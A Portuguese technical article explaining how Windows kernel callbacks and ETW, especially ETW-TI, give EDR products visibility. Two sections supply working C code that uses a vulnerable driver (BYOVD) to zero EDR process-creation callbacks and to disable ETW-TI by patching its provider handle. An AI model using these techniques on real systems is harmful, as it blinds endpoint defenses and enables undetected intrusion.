---
title: "Kernel Callbacks & ETW"
---

# Kernel Callbacks e ETW: Como EDRs Monitoram o Sistema

# O que é?

Kernel callbacks e ETW (Event Tracing for Windows) são os dois pilares técnicos fundamentais que permitem a EDRs modernos monitorar, interceptar e bloquear operações de segurança diretamente no nível do kernel do Windows.

**Kernel callbacks** são mecanismos nativos do Windows kernel que permitem que drivers registrem funções de callback a serem chamadas automaticamente pelo próprio kernel em eventos específicos do sistema. São APIs exportadas por ntoskrnl.exe para uso por drivers de kernel mode:

- `PsSetCreateProcessNotifyRoutine` / `PsSetCreateProcessNotifyRoutineEx` — chamado a cada criação ou terminação de processo no sistema. Permite ao driver do EDR inspecionar nome do processo, linha de comando, PID pai — e bloquear a criação retornando `STATUS_ACCESS_DENIED`.
- `PsSetLoadImageNotifyRoutine` — chamado a cada carregamento de imagem executável ou DLL em qualquer processo. Permite detectar DLLs carregadas de caminhos suspeitos, DLLs sem backing em disco (reflective injection), e hooking de APIs.
- `PsSetCreateThreadNotifyRoutine` — chamado a cada criação ou terminação de thread. Detecta `CreateRemoteThread` e variantes de injeção via thread.
- `ObRegisterCallbacks` — o mais poderoso: intercepta operações de handle em objetos processo e thread **antes** de serem concedidas, permitindo remover permissões específicas (como `PROCESS_VM_READ` em LSASS) antes de retornar o handle.
- `CmRegisterCallback` — intercepta operações de registry (leitura, escrita, criação, deleção de chaves) antes e depois de executarem.

**ETW (Event Tracing for Windows)** é o framework de logging de alta performance do Windows, presente desde o Windows 2000 e significativamente expandido no Windows 10 para segurança. Providers emitem eventos identificados por GUIDs, sessions os coletam em buffers, consumers os processam em tempo real ou de arquivo. O throughput é extremamente alto — ETW foi projetado para logging de kernel com overhead mínimo via técnica de buffer circular em memória compartilhada.

O provider mais crítico para segurança é o **ETW-TI (Microsoft-Windows-Threat-Intelligence)** — GUID `F4E1897C-BB5D-5668-F1D8-040F4D8DD344`. Ele foi criado especificamente pela Microsoft para dar a EDRs visibilidade protegida sobre operações de injeção de código:

```
  ETW-TI gera eventos para:
  +------------------------------------------+
  | KERNEL_THREATINT_TASK_ALLOCVM_REMOTE      |  VirtualAllocEx em outro processo
  | KERNEL_THREATINT_TASK_PROTECTVM_REMOTE    |  VirtualProtectEx em outro processo
  | KERNEL_THREATINT_TASK_MAP_VIEW_REMOTE     |  MapViewOfSection em outro processo
  | KERNEL_THREATINT_TASK_OS_WRITE_REMOTE     |  NtWriteVirtualMemory em outro processo
  | KERNEL_THREATINT_TASK_THREAD_REMOTE       |  CreateRemoteThread
  | KERNEL_THREATINT_TASK_QUEUEUSERAPC_REMOTE |  QueueUserAPC em thread remota
  | KERNEL_THREATINT_TASK_SETTHREADCONTEXT    |  SetThreadContext
  | KERNEL_THREATINT_TASK_READVM_LOCAL        |  ReadProcessMemory local
  +------------------------------------------+
```

O que torna ETW-TI especial é sua proteção por PPL (Protected Process Light): apenas processos com nível de proteção adequado (como o agente do EDR rodando como PPL) podem consumir esse provider. Processos comuns — mesmo com privilégio SYSTEM — não conseguem consumir ETW-TI, o que o torna resistente a neutralização via userland.

---

# Onde é implementado?

**Kernel callbacks são usados por:**

Qualquer produto de segurança que precise de visibilidade em tempo real sobre eventos do sistema precisa registrar callbacks de kernel via seu driver:

- Antivírus tradicionais (Windows Defender / MDE, Kaspersky, Trend Micro, ESET, Sophos) — usam PsSetCreateProcessNotifyRoutine para inspecionar processos e PsSetLoadImageNotifyRoutine para escanear DLLs em tempo de carregamento.
- EDRs (CrowdStrike Falcon, SentinelOne, Carbon Black, Cybereason, Elastic EDR) — usam o conjunto completo de callbacks incluindo ObRegisterCallbacks para bloquear acesso ao LSASS.
- DLP (Data Loss Prevention) — usam CmRegisterCallback para monitorar escrita em chaves de registry e PsSetCreateProcessNotifyRoutine para controlar quais aplicações podem rodar.
- Controle de acesso e gestão de aplicações (AppLocker enforcement via kernel) — dependem de callbacks de processo para bloquear execução de software não autorizado.
- Ferramentas de auditoria e compliance (Sysmon da Sysinternals/Microsoft) — registram callbacks para logging de eventos de processo, thread, DLL e registry.

**ETW é consumido por:**

- Ferramentas de diagnóstico e performance da Microsoft: Windows Performance Analyzer (WPA), Windows Performance Recorder (WPR), xperf. ETW foi projetado originalmente para profiling de performance.
- Ferramentas de monitoramento: Process Monitor (Sysinternals) usa ETW para capturar eventos de filesystem e registry em tempo real. Sysmon usa ETW como fonte complementar a callbacks.
- Todos os EDRs modernos: CrowdStrike, SentinelOne, Microsoft Defender for Endpoint, Elastic — consomem ETW-TI para detectar injeção de processo antes que o payload execute.
- Ferramentas de debugging: WinDbg pode consumir ETW providers. Event Viewer expõe eventos ETW via Windows Event Log.
- SIEM e coleta de telemetria: Azure Monitor, Microsoft Sentinel, Splunk UBA — coletam eventos ETW via Windows Event Forwarding (WEF).

**ETW-TI especificamente:**

```
  Quem pode consumir ETW-TI:

  +---------------------------+       +---------------------------+
  | EDR Agent (PPL ou kernel) |  SIM  | Processo normal com       |
  | CrowdStrike sensor        +------>| SYSTEM privilege          | NÃO
  | SentinelOne agent         |       | (não tem nivel PPL)       |
  | MDE (Defender for Endpt)  |       +---------------------------+
  +---------------------------+

  Por quê: ETW-TI requer que o consumidor tenha nível de proteção
  adequado — PPL com signer WinTcb, AntiMalware ou similar.
  Isso impede que atacantes em userland (mesmo com SYSTEM) ouçam
  o mesmo canal de telemetria que o EDR usa.
```

ETW-TI foi introduzido no Windows 10 como resposta direta a técnicas de injeção de processo que burlavam callbacks de kernel. Antes do ETW-TI, um atacante que injetasse shellcode sem criar um novo processo (ex: via thread hijacking) poderia passar despercebido pelos callbacks. ETW-TI captura as primitivas de memória em si (VirtualAllocEx, WriteProcessMemory), independente de qual técnica de entrega é usada.

---

# Como funciona de forma adequada?

O funcionamento legítimo de kernel callbacks e ETW pode ser entendido através do fluxo de dados de uma operação comum monitorada: criação de processo, carregamento de DLL, e injeção de código.

**Arquitetura de um driver de EDR e seus callbacks:**

```
  +-----------------------------------------------------------+
  |                  EDR Kernel Driver                        |
  |  (ex: WdFilter.sys, CSAgent.sys, SentinelMonitor.sys)    |
  |                                                           |
  |  DriverEntry():                                           |
  |    PsSetCreateProcessNotifyRoutineEx(OnProcess, FALSE)    |
  |    PsSetLoadImageNotifyRoutine(OnImage)                   |
  |    PsSetCreateThreadNotifyRoutine(OnThread)               |
  |    ObRegisterCallbacks(&regInfo, &handle)                 |
  |    CmRegisterCallback(OnRegistry, ctx, &cookie)           |
  +------------------+---------------------------+-----------+
                     |                           |
                     | callbacks registrados     | ETW consumer
                     v                           v
  +-----------------------------------------------------------+
  |                 Windows Kernel (ntoskrnl.exe)             |
  |                                                           |
  |  PspCreateProcessNotifyRoutine[64]  ← array de callbacks |
  |  PspLoadImageNotifyRoutine[64]      ← array de callbacks |
  |  PspCreateThreadNotifyRoutine[64]   ← array de callbacks |
  |                                                           |
  |  Quando novo processo cria:                               |
  |    for(i=0; i<count; i++)                                 |
  |      callbacks[i](Process, PID, CreateInfo)  ← chama EDR |
  +-----------------------------------------------------------+
```

**Ciclo completo de um evento de processo sendo monitorado:**

```
  1. calc.exe é iniciado via cmd.exe

  2. ntoskrnl.exe — NtCreateUserProcess()
     |
     +-> Processo criado em estado suspenso
     |
     +-> Iterar PspCreateProcessNotifyRoutine array:
         |
         +-> [0] WdFilter.sys callback:
         |       recebe Process, PID, CreateInfo
         |       inspeciona ImageFileName, CommandLine
         |       decide: PERMITIR (não bloqueia)
         |
         +-> [1] CSAgent.sys callback (CrowdStrike):
                 recebe Process, PID, CreateInfo
                 inspects: parent PID, cmd line, hash do exe
                 correlaciona com regras de detecção
                 decide: PERMITIR (sem IOC detectado)

  3. Processo calc.exe inicia normalmente
```

**Como ObRegisterCallbacks bloqueia acesso ao LSASS:**

```
  Mimikatz tenta:
  OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, lsassPID)

  Kernel:
    ObpCreateHandle()
      |
      +-> ObCallPreCallbacks() — itera callbacks de ObRegisterCallbacks
          |
          +-> EDR Pre-operation callback:
              DesiredAccess = PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION
              if (target == LSASS):
                  DesiredAccess &= ~(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION)
                  ← remove as permissões antes de criar o handle
          |
      +-> Handle criado com DesiredAccess MODIFICADO (sem VM_READ)

  Mimikatz recebe handle válido mas SEM PERMISSÃO de leitura
  ReadProcessMemory() falha com ACCESS_DENIED
  → Mimikatz falha silenciosamente
```

**Fluxo completo do ETW — provider para consumer:**

```
  +------------------+     EtwWrite()    +-------------------+
  | ETW Provider     +-----------------> | ETW Session       |
  | (kernel mode)    |                   | (buffer circular) |
  |                  |                   |                   |
  | ntoskrnl.exe     |  evento gerado:   | Microsoft-Windows |
  | emite evento     |  VirtualAllocEx   | -Threat-Intell.   |
  | quando:          |  em processo X    |                   |
  | NtAllocateVM     |  por processo Y   +--------+----------+
  | com target ≠ self|                            |
  +------------------+                            | entrega assíncrona
                                                  v
                                         +------------------+
                                         | EDR Consumer     |
                                         | (PPL-protected)  |
                                         |                  |
                                         | processa evento: |
                                         | caller ≠ target  |
                                         | proteção PAGE_   |
                                         | EXECUTE_READWRITE|
                                         | → alerta gerado  |
                                         +------------------+
```

**Por que PPL protege o consumer de ETW-TI:**

```
  Proteção PPL (Protected Process Light) — níveis de proteção:

  WinTcb          (mais alto — usado por smss.exe, csrss.exe)
  WinTcb-Light    (lsaiso.exe, lsass.exe com CG)
  Windows         (serviços críticos do SO)
  Windows-Light
  Antimalware     (EDR agents — podem abrir PPL menores)
  Antimalware-Light
  Lsa             (LSA relacionados)
  Lsa-Light
  None            (processos normais — incluindo SYSTEM)

  Regra: processo A pode terminar/injetar em processo B
         apenas se A.signer >= B.signer

  EDR como Antimalware-Light: processo SYSTEM (None) não pode
  terminar o agente do EDR. Mesmo SeDebugPrivilege não ajuda —
  a proteção é imposta pelo kernel na criação de handle.
```

**Como um array de callbacks é estruturado no kernel — benefícios do design:**

```
  ntoskrnl.exe — PspCreateProcessNotifyRoutine

  Endereço: 0xFFFFF80000A2E1C0  (exemplo)
  Formato de cada entrada:
    bits [63:4] = ponteiro para EX_CALLBACK_ROUTINE_BLOCK
    bits [3:0]  = flags (ex: bit 0 = marcado para remoção)

  EX_CALLBACK_ROUTINE_BLOCK:
  +--------------------------------------+
  | RefCount    (4 bytes)                |
  | Padding     (4 bytes)                |
  | Callback    (8 bytes) → função real  |
  | Context     (8 bytes) → dados do EDR |
  +--------------------------------------+

  Por que esse design:
  - Permite múltiplos produtos de segurança coexistir (64 callbacks)
  - Remoção segura sem locks (bit de flag + RefCount)
  - Auditável: qualquer driver pode enumerar quem registrou callbacks
    (via PsSetCreateProcessNotifyRoutine com Remove=TRUE + scan)
  - Suporta callback síncrono (pode bloquear a operação antes
    de retornar ao código que a iniciou)
```

---

## Callbacks de Kernel e Providers ETW: A Visibilidade do EDR

### Arquitetura Geral: Como o EDR "Vê" o Sistema

```
┌─────────────────────────────────────┐
│          EDR User-Mode Agent        │
│  (svchost, MsMpEng, CSAgent, etc.)  │
└──────────────┬──────────────────────┘
               │ eventos via callbacks
               │ + ETW consumers
┌──────────────▼──────────────────────┐
│         EDR Kernel Driver           │
│  - Registra callbacks               │
│  - Injeta DLLs (hooks userland)     │
│  - Consome ETW-TI                   │
└──────┬───────────────────────┬──────┘
       │ callbacks             │ ETW
┌──────▼──────┐     ┌──────────▼──────┐
│  Kernel APIs│     │   ETW Providers  │
│ (ntoskrnl)  │     │  (kernel-mode)   │
└─────────────┘     └──────────────────┘
```

---

## Kernel Callbacks em Detalhe

### 1. PsSetCreateProcessNotifyRoutine

**O que é:** Registra uma função de callback que o kernel invoca toda vez que um processo é criado ou terminado.

**Sintaxe:**
```c
NTSTATUS PsSetCreateProcessNotifyRoutine(
    PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine,
    BOOLEAN Remove
);

// Versão estendida (Windows Vista+):
NTSTATUS PsSetCreateProcessNotifyRoutineEx(
    PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,
    BOOLEAN Remove
);
```

**O que o EDR recebe no callback:**
```c
VOID CreateProcessCallback(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo  // NULL se terminação
) {
    if (CreateInfo) {
        // Processo sendo criado:
        UNICODE_STRING* imageName = CreateInfo->ImageFileName;
        UNICODE_STRING* cmdLine   = CreateInfo->CommandLine;
        HANDLE parentPid          = CreateInfo->ParentProcessId;
        HANDLE creatingThreadId   = CreateInfo->CreatingThreadId;
        
        // EDR inspeciona: nome do exe, command line, parent, etc.
        // Pode BLOQUEAR a criação: CreateInfo->CreationStatus = STATUS_ACCESS_DENIED
    }
}
```

**Limites e estrutura interna:**
- Limite de **64 callbacks** simultâneos no sistema
- O array `PspCreateProcessNotifyRoutine` em ntoskrnl armazena ponteiros para os callbacks
- Cada entrada tem a forma `ponteiro & ~0xF` (últimos 4 bits são flags)
- O contador `PspCreateProcessNotifyRoutineCount` rastreia quantos estão ativos

**O que o EDR detecta via esse callback:**
- Qualquer `CreateProcess`, `ShellExecute`, WMI spawn
- Process hollowing (processo criado em estado suspenso — PPID visível)
- Child processes de processos suspeitos
- Command line de powershell com parâmetros suspeitos

### 2. PsSetLoadImageNotifyRoutine

**O que é:** Callback invocado toda vez que uma imagem (executável ou DLL) é mapeada no espaço de um processo.

**Sintaxe:**
```c
NTSTATUS PsSetLoadImageNotifyRoutine(
    PLOAD_IMAGE_NOTIFY_ROUTINE NotifyRoutine
);

// Callback recebe:
VOID LoadImageCallback(
    PUNICODE_STRING FullImageName,  // Caminho completo da DLL/EXE
    HANDLE ProcessId,               // Processo que carregou a imagem
    PIMAGE_INFO ImageInfo           // Base, tamanho, flags
);
```

**O que o EDR detecta:**
- Toda DLL carregada em qualquer processo (inspeção de imports, hooks)
- Reflective DLL injection: DLL carregada de memória sem path em disco — `FullImageName` fica NULL ou vazio, sinal suspeito
- Carregamento de DLLs de caminhos incomuns (`C:\Users\Public\`, `C:\Temp\`)
- Carregamento de DLLs não-assinadas em processos sensíveis (lsass, explorer)

**Limite:** 64 callbacks simultâneos.

### 3. PsSetCreateThreadNotifyRoutine

**O que é:** Callback invocado ao criar ou terminar threads.

```c
NTSTATUS PsSetCreateThreadNotifyRoutine(
    PCREATE_THREAD_NOTIFY_ROUTINE NotifyRoutine
);

VOID ThreadCallback(
    HANDLE ProcessId,
    HANDLE ThreadId,
    BOOLEAN Create  // TRUE = criação, FALSE = terminação
);
```

**O que o EDR detecta:**
- `CreateRemoteThread` em outro processo → Thread criada em processo diferente do criador → injection clássica
- `NtCreateThreadEx` com flags suspeitas
- Threads criadas em processos protegidos (lsass)
- Thread injection via `QueueUserAPC`, `SetThreadContext` (thread em suspended state)

### 4. ObRegisterCallbacks

**O que é:** O mais poderoso dos callbacks para EDR. Permite interceptar e **modificar** operações de handle — incluindo BLOQUEAR `OpenProcess` com flags específicas.

```c
NTSTATUS ObRegisterCallbacks(
    POB_CALLBACK_REGISTRATION CallbackRegistration,
    PVOID *RegistrationHandle
);

// Structure:
OB_OPERATION_REGISTRATION opReg = {
    .ObjectType = PsProcessType,  // Processos
    .Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
    .PreOperation  = PreOpenProcessCallback,
    .PostOperation = PostOpenProcessCallback
};
```

**Pre-Operation Callback (antes de criar o handle):**
```c
OB_PREOP_CALLBACK_STATUS PreOpenProcessCallback(
    PVOID RegistrationContext,
    POB_PRE_OPERATION_INFORMATION OperationInformation
) {
    // Se tentando abrir LSASS com PROCESS_VM_READ:
    if (targetPid == lsassPid && 
        desiredAccess & PROCESS_VM_READ) {
        // Remove a permissão!
        OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=
            ~(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION);
    }
    return OB_PREOP_SUCCESS;
}
```

**O que o EDR detecta e bloqueia:**
- Qualquer `OpenProcess(PROCESS_VM_READ, lsassPID)` → bloqueia acesso para credencial dumping
- Acesso a processos marcados como sensíveis
- Duplicação de handles para processos protegidos

**Por que isso importa:** Mimikatz e ferramentas de dump de LSASS falham silenciosamente em sistemas com EDR moderno não porque são detectadas pelo AV, mas porque o ObCallback **remove a permissão PROCESS_VM_READ do handle** antes de retorná-lo — o processo recebe um handle sem acesso.

### 5. CmRegisterCallback

**O que é:** Callback para operações de registry em tempo real — antes e depois de criação, leitura, escrita, deleção de chaves.

```c
NTSTATUS CmRegisterCallback(
    PEX_CALLBACK_FUNCTION Function,
    PVOID Context,
    PLARGE_INTEGER Cookie
);

// Eventos:
// RegNtPreSetValueKey, RegNtPostSetValueKey
// RegNtPreCreateKey, RegNtPostCreateKey
// RegNtPreDeleteKey, RegNtPostDeleteKey
// RegNtPreDeleteValueKey, etc.
```

**O que o EDR detecta:**
- Escrita em chaves de persistência (`Run`, `RunOnce`, `Services`)
- Modificação de chaves de segurança (SAM, LSA, policies)
- Criação de serviços via registry
- Alteração de configurações de segurança do Windows Defender

### Como Remover Callbacks de EDR

**Pré-requisito:** Kernel R/W via driver vulnerável (BYOVD).

**Passo 1: Encontrar base do ntoskrnl**
```c
// Método 1: Via NtQuerySystemInformation
#define SystemModuleInformation 11

ULONG64 GetNtoskrnlBase() {
    ULONG bufferSize = 0;
    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &bufferSize);
    
    PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(bufferSize);
    NtQuerySystemInformation(SystemModuleInformation, modules, bufferSize, NULL);
    
    // ntoskrnl.exe é sempre o módulo de índice 0
    ULONG64 base = (ULONG64)modules[0].Modules[0].ImageBase;
    free(modules);
    return base;
}

// Método 2: Via EnumDeviceDrivers (requer admin)
ULONG64 GetNtoskrnlBaseAlt() {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
    return (ULONG64)drivers[0];  // ntoskrnl é sempre primeiro
}
```

**Passo 2: Encontrar offset de PspCreateProcessNotifyRoutine**

Os offsets variam por versão do Windows. EDRSandblast mantém banco de dados. Para calcular manualmente:
```bash
# No WinDbg (kernel debugging):
x nt!PspCreateProcessNotifyRoutine

# No IDA/Ghidra: analisar ntoskrnl.exe e buscar xref para PsSetCreateProcessNotifyRoutine
# O array está logo após o código de validação da função
```

**Passo 3: Iterar e zerar callbacks do EDR**
```c
// Supondo que temos ReadMemoryQword e WriteMemoryQword via driver vulnerável

void RemoveEDRCallbacks(HANDLE hDriver, ULONG64 ntoskrnlBase) {
    // Offset pré-calculado para a versão do SO
    ULONG64 arrayAddr = ntoskrnlBase + PSPCREATEPROCNOTIFY_OFFSET;
    ULONG64 countAddr = ntoskrnlBase + PSPCREATEPROCNOTIFY_COUNT_OFFSET;
    
    DWORD count = ReadMemoryDword(hDriver, countAddr);
    printf("[*] %d callbacks registrados\n", count);
    
    for (int i = 0; i < 64; i++) {
        ULONG64 entry = ReadMemoryQword(hDriver, arrayAddr + (i * 8));
        if (entry == 0) continue;
        
        // Limpar flags dos últimos 4 bits para obter ponteiro real
        ULONG64 callbackPtr = entry & ~0xF;
        
        // Ler nome do módulo dono do callback
        // (navegar EX_CALLBACK_ROUTINE_BLOCK → módulo)
        char* moduleName = GetCallbackModuleName(hDriver, callbackPtr);
        
        if (IsEDRModule(moduleName)) {
            printf("[+] Removendo callback do EDR: %s\n", moduleName);
            // Zerar o ponteiro
            WriteMemoryQword(hDriver, arrayAddr + (i * 8), 0);
            // Decrementar contador
            DWORD newCount = ReadMemoryDword(hDriver, countAddr);
            WriteMemoryDword(hDriver, countAddr, newCount - 1);
        }
    }
}
```

---

## ETW (Event Tracing for Windows) em Detalhe

### Arquitetura Completa

```
┌──────────────────────────────────────────────────────┐
│                    PROVIDERS                          │
│  (kernel ou user-mode, identificados por GUID)       │
│                                                       │
│  Windows Kernel (ETW-TI, ETW-Process, ETW-Network)  │
│  PowerShell (Microsoft-Windows-PowerShell)           │
│  AMSI (Microsoft-Antimalware-Scan-Interface)         │
│  WMI (Microsoft-Windows-WMI-Activity)                │
└──────────────────┬───────────────────────────────────┘
                   │ eventos (via EventWrite)
┌──────────────────▼───────────────────────────────────┐
│                    SESSIONS                           │
│  (coletam eventos, bufferam, enviam para consumers)  │
│                                                       │
│  NT Kernel Logger (kernel events)                    │
│  Microsoft-Windows-Threat-Intelligence               │
│  SilkETW / Custom sessions                           │
└──────────────────┬───────────────────────────────────┘
                   │ eventos processados
┌──────────────────▼───────────────────────────────────┐
│                   CONSUMERS                          │
│  (processam eventos em tempo real ou de arquivo)     │
│                                                       │
│  EDR Agent (em tempo real via ETW session)           │
│  Windows Event Log                                   │
│  SIEM / Azure Sentinel                               │
│  SilkETW (para análise)                              │
└──────────────────────────────────────────────────────┘
```

### Providers Críticos para Segurança

#### Microsoft-Windows-Threat-Intelligence (ETW-TI)

**GUID:** `F4E1897C-BB5D-5668-F1D8-040F4D8DD344`

Este é o provider mais importante para EDRs. Ativo apenas para consumidores com privilégio de PPL ou kernel — protegido especificamente contra acesso por processos normais mesmo com SYSTEM.

**Eventos gerados:**
```
KERNEL_THREATINT_TASK_ALLOCVM_REMOTE    (VirtualAllocEx em outro processo)
KERNEL_THREATINT_TASK_PROTECTVM_REMOTE  (VirtualProtectEx em outro processo)
KERNEL_THREATINT_TASK_MAP_VIEW_REMOTE   (MapViewOfSection em outro processo)
KERNEL_THREATINT_TASK_OS_WRITE_REMOTE   (NtWriteVirtualMemory em outro processo)
KERNEL_THREATINT_TASK_THREAD_REMOTE     (CreateRemoteThread)
KERNEL_THREATINT_TASK_QUEUEUSERAPC_REMOTE (QueueUserAPC em thread remota)
KERNEL_THREATINT_TASK_SETTHREADCONTEXT  (SetThreadContext)
KERNEL_THREATINT_TASK_READVM_LOCAL      (ReadProcessMemory em processo local)
KERNEL_THREATINT_TASK_WRITEVM_LOCAL     (WriteProcessMemory em processo local)
KERNEL_THREATINT_TASK_SET_WINDOWS_HOOK  (SetWindowsHookEx)
```

**Por que isso importa:** Injeção de processo clássica (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread) gera 3+ eventos ETW-TI antes que o código executado gere qualquer evento de processo. O EDR vê a injeção **antes** de qualquer comportamento do payload.

```bash
# Listar sessions ativas de ETW-TI
logman query providers | findstr "Threat"
logman query providers | findstr /i "threat\|security\|kernel"

# Ver sessões ativas
logman query -ets

# Checar se ETW-TI está sendo consumido
Get-WinEvent -ListLog * | Where-Object {$_.LogName -like "*Threat*"}
```

#### Microsoft-Windows-Kernel-Process

**GUID:** `22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716`

```
Evento 1: ProcessStart (PID, PPID, nome, linha de comando, hash)
Evento 2: ProcessStop
Evento 3: ThreadStart (thread criada)
Evento 4: ThreadStop
Evento 5: ImageLoad (DLL/EXE carregado)
Evento 6: ImageUnload
```

**Diferença de callbacks:** Este provider gera eventos **assíncronos** que podem ser descartados em alta carga, diferente dos callbacks que são síncronos. Porém, o EDR normalmente usa ambos — callbacks para decisão em tempo real, ETW para correlação histórica.

#### Microsoft-Windows-PowerShell

**GUID:** `A0C1853B-5C40-4B15-8766-3CF1C58F985A`

```
Evento 4104: ScriptBlockLogging — todo bloco de código PowerShell executado
Evento 4103: ModuleLogging — módulos importados
Evento 4100: ProviderLifecycle
```

**Evento 4104 (ScriptBlockLogging)** captura o script PowerShell **após deobfuscação** — o texto que realmente vai ser executado, independente de quantas camadas de codificação base64 foram usadas. É por isso que apenas encodar em base64 não evade script block logging.

```powershell
# Verificar se Script Block Logging está ativo
(Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging).EnableScriptBlockLogging

# Evento 4104 inclui o hash SHA256 do script
# Correlacionar: mesmo hash em múltiplos sistemas = pivot
```

#### Microsoft-Antimalware-Scan-Interface (AMSI)

**GUID:** `2A576B87-09A7-520E-C21A-4942F0271D67`

```
Evento 1101: AMSI scan content (conteúdo enviado para scan)
Evento 1102: Result do scan (AMSI_RESULT_CLEAN, AMSI_RESULT_DETECTED, etc.)
```

Mesmo que o conteúdo não seja detectado pelo AV, **o EDR pode ver o que foi enviado para AMSI** via esse provider. Útil para correlação.

#### Microsoft-Windows-Security-Auditing

**GUID:** `54849625-5478-4994-A5BA-3E3B0328C30D`

Provider que alimenta os eventos de segurança do Windows Event Log (4624, 4625, 4648, 4688, 4720, etc.). Diferente dos outros, estes são consumidos pelo Windows Event Log e encaminhados para SIEM via WEF (Windows Event Forwarding).

### Como Desativar ETW-TI via BYOVD

ETW-TI não pode ser desativado de userland nem com SYSTEM privileges — requer kernel access.

**Método 1: Patch do EtwThreatIntProvRegHandle**

O provider ETW-TI registra um handle (`EtwThreatIntProvRegHandle`) em ntoskrnl. Zerando ou corrompendo esse handle, os eventos não são mais gerados:

```c
// Encontrar offset de EtwThreatIntProvRegHandle em ntoskrnl
// (varia por versão — EDRSandblast tem banco de dados)

// Ler valor atual
ULONG64 handleAddr = ntoskrnlBase + ETW_TI_HANDLE_OFFSET;
ULONG64 currentHandle = ReadMemoryQword(hDriver, handleAddr);
printf("[*] EtwThreatIntProvRegHandle: 0x%llx\n", currentHandle);

// Zerar o handle — ETW-TI para de gerar eventos
WriteMemoryQword(hDriver, handleAddr, 0);
printf("[+] ETW-TI desativado\n");
```

**Método 2: Patch da ProviderContext — função de dispatch**

Mais cirúrgico: em vez de zerar o handle, patchear o ponteiro de função na estrutura `_ETW_REG_ENTRY` que aponta para a rotina de dispatch de eventos:

```c
// Estrutura simplificada de _ETW_REG_ENTRY (varia por versão):
typedef struct _ETW_REG_ENTRY {
    // ...
    PETWENABLECALLBACK EnableCallback;  // ponteiro de função
    // ...
} ETW_REG_ENTRY;

// Substituir EnableCallback por função nop
WriteMemoryQword(hDriver, callbackPtrAddr, 0); // ou endereço de RET
```

**Verificar se ETW-TI foi desativado:**
```powershell
# Usando SilkETW, tentar consumir o provider:
SilkETW.exe -t kernel -pn Microsoft-Windows-Threat-Intelligence -ot file -p C:\test.json
# Se desativado: sem eventos mesmo ao fazer injeção de processo

# Ou verificar se provider está registrado:
logman query providers | findstr "F4E1897C"
```

### SilkETW — Ferramenta de Análise de ETW

SilkETW permite consumir qualquer provider ETW e salvar eventos em JSON — essencial para entender o que suas técnicas geram antes de usar no alvo.

```bash
# Instalar (Windows)
# Download: https://github.com/mandiant/SilkETW

# Monitorar ETW-TI em tempo real
SilkETW.exe -t kernel -pn Microsoft-Windows-Threat-Intelligence -ot file -p C:\logs\ti.json

# Monitorar processos
SilkETW.exe -t kernel -pn Microsoft-Windows-Kernel-Process -ot file -p C:\logs\proc.json

# Monitorar PowerShell
SilkETW.exe -t user -pn Microsoft-Windows-PowerShell -ot file -p C:\logs\ps.json

# Monitorar AMSI
SilkETW.exe -t user -pn Microsoft-Antimalware-Scan-Interface -ot file -p C:\logs\amsi.json

# Filtrar por evento específico (ex: só ScriptBlockLogging = evento 4104)
SilkETW.exe -t user -pn Microsoft-Windows-PowerShell -f EventId -fv 4104 -ot file -p C:\logs\sbl.json

# Output JSON processável com jq (no Kali)
# Copiar arquivo e analisar:
cat C:\logs\ti.json | python3 -m json.tool | grep -A5 "allocvm\|writevm\|threadremote"
```

**Exemplo de evento ETW-TI capturado (VirtualAllocEx):**
```json
{
  "EventHeader": {
    "EventDescriptor": {
      "Id": 1,
      "Task": 13  // KERNEL_THREATINT_TASK_ALLOCVM_REMOTE
    }
  },
  "Payload": {
    "CallingProcessId": 4567,
    "CallingProcessCreateTime": "...",
    "CallingProcessStartKey": "...",
    "CallingProcessSignatureLevel": 0,
    "CallingProcessSectionSignatureLevel": 0,
    "CallingProcessProtection": 0,
    "TargetProcessId": 812,
    "TargetProcessCreateTime": "...",
    "TargetProcessSignatureLevel": 12,
    "TargetProcessProtection": 0,
    "OriginalDesiredAccess": "0x1FFFFF",
    "GrantedDesiredAccess": "0x1FFFFF",
    "BaseAddress": "0x7FFABCDE0000",
    "RegionSize": "0x10000",
    "AllocationType": "0x3000",
    "PageProtection": "0x40"
  }
}
```

---

## ETW — Internals do Kernel: Estruturas e Fluxos

> Como o ETW funciona internamente no kernel — essencial para entender exatamente o que patchear e por quê.

### Tipos de Provider

| Tipo | Encoding | Uso |
|------|----------|-----|
| MOF (Classic) | MOF class descriptor | WMI, legacy; apenas 1 sessão simultânea |
| WPP | TMF trace message format | Drivers, depuração; apenas 1 sessão |
| Manifest-based | XML manifest compilado na DLL | Windows moderno — padrão; até 8 sessões |
| TraceLogging | Self-describing (payload contém schema) | Telemetria rápida; até 8 sessões |

### DLLs e Componentes Envolvidos

```
User-Mode:
  Sechost.dll    → API de nível alto para controllers (StartTrace, EnableTraceEx2)
  TDH.dll        → Trace Data Helper — decodifica payload binário via manifest
  WevtApi.dll    → Windows Event Log API — consome .evtx/.etl (consumers)
  Ntdll.dll      → Stubs NtTraceControl → transição para kernel

Kernel-Mode:
  ETW (ntoskrnl) → implementação principal — array de sessões, hash table de providers
  Secure Kernel  → VTL 1: Security Audit Logger protegido por PPL
```

### Estruturas Internas de Dados

#### ETW_LOGGER_CONTEXT — Sessão ETW

```
ETW_LOGGER_CONTEXT
  ├─ LoggerId            : índice no array de sessões (= Logger Id em xperf -Loggers)
  ├─ LoggerName          : nome da sessão
  ├─ LoggerThread        : ponteiro para thread logger desta sessão
  ├─ BufferList[]        : lista de buffers por processador (default 8–64 KB por buffer)
  ├─ SecurityDescriptor  : controla quem pode controlar/acessar a sessão
  ├─ EnableFlags         : kernel flags para system loggers (PROC_THREAD, LOADER, etc.)
